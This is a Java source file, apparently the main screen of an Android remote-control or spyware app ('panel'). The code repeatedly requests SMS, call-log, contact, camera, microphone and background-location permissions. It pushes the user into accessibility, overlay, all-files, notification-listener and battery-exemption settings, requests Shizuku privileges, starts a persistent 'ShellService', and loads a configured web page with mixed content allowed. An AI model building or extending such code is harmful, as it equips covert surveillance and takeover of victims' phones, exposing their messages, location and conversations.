package com.java.panel;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

public class MainActivity extends AppCompatActivity {

    public static MainActivity instance;
    private WebView webView;
    private boolean isCheckingPermissions = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        instance = this;
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        webView.setWebViewClient(new WebViewClient());
        
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setLoadsImagesAutomatically(true);
        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        startPanelService();
        loadWebUrlFromConfig();
    }

    @Override
    protected void onResume() {
        super.onResume();
        isCheckingPermissions = false;
        checkAndRequestAllPermissions();
    }

    public void loadUrl(String url) {
        runOnUiThread(() -> {
            if (webView != null) {
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    webView.loadUrl("https://" + url);
                } else {
                    webView.loadUrl(url);
                }
            }
        });
    }

    private void checkAndRequestAllPermissions() {
        if (isCheckingPermissions) return;
        isCheckingPermissions = true;

        List<String> permissionList = new ArrayList<>(Arrays.asList(
            Manifest.permission.INTERNET,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_WIFI_STATE,
            Manifest.permission.VIBRATE
        ));
        if (Build.VERSION.SDK_INT >= 31) {
            permissionList.add("android.permission.BLUETOOTH_SCAN");
            permissionList.add("android.permission.BLUETOOTH_CONNECT");
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }

        String[] permissions = permissionList.toArray(new String[0]);

        boolean needRequest = false;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needRequest = true;
                break;
            }
        }

        if (needRequest) {
            ActivityCompat.requestPermissions(this, permissions, 100);
        }

        try {
            if (!isAccessibilityServiceEnabled()) {
                Intent accessibilityIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(accessibilityIntent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                    startActivity(overlayIntent);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            if (Build.VERSION.SDK_INT >= 30) {
                boolean isGranted = false;
                try {
                    Method method = Environment.class.getMethod("isExternalStorageManager");
                    isGranted = (Boolean) method.invoke(null);
                } catch (Exception e) {
                }
                if (!isGranted) {
                    Intent storageIntent = new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
                    startActivity(storageIntent);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            if (!isNotificationServiceEnabled()) {
                Intent notifIntent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(notifIntent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.System.canWrite(this)) {
                    Intent writeIntent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:" + getPackageName()));
                    startActivity(writeIntent);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + getPackageName()));
                    startActivity(batteryIntent);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        requestShizukuPermission();
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null) {
            return flat.contains(pkgName);
        }
        return false;
    }

    private boolean isAccessibilityServiceEnabled() {
        String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (prefString != null) {
            return prefString.contains(getPackageName() + "/" + MyAccessibilityService.class.getName());
        }
        return false;
    }

    private void requestShizukuPermission() {
        try {
            Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
            Method checkMethod = shizukuClass.getDeclaredMethod("checkSelfPermission");
            int res = (int) checkMethod.invoke(null);
            if (res != 0) {
                Method reqMethod = shizukuClass.getDeclaredMethod("requestPermission", int.class);
                reqMethod.invoke(null, 1002);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startPanelService() {
        Intent serviceIntent = new Intent(this, ShellService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void loadWebUrlFromConfig() {
        try {
            InputStream is = getAssets().open("config.txt");
            Scanner scanner = new Scanner(is);
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine().trim();
                if (line.startsWith("WEB_URL=")) {
                    String url = line.substring(8).trim();
                    loadUrl(url);
                    break;
                }
            }
            scanner.close();
            is.close();
        } catch (Exception e) {
            loadUrl("https://www.google.com");
        }
    }
}
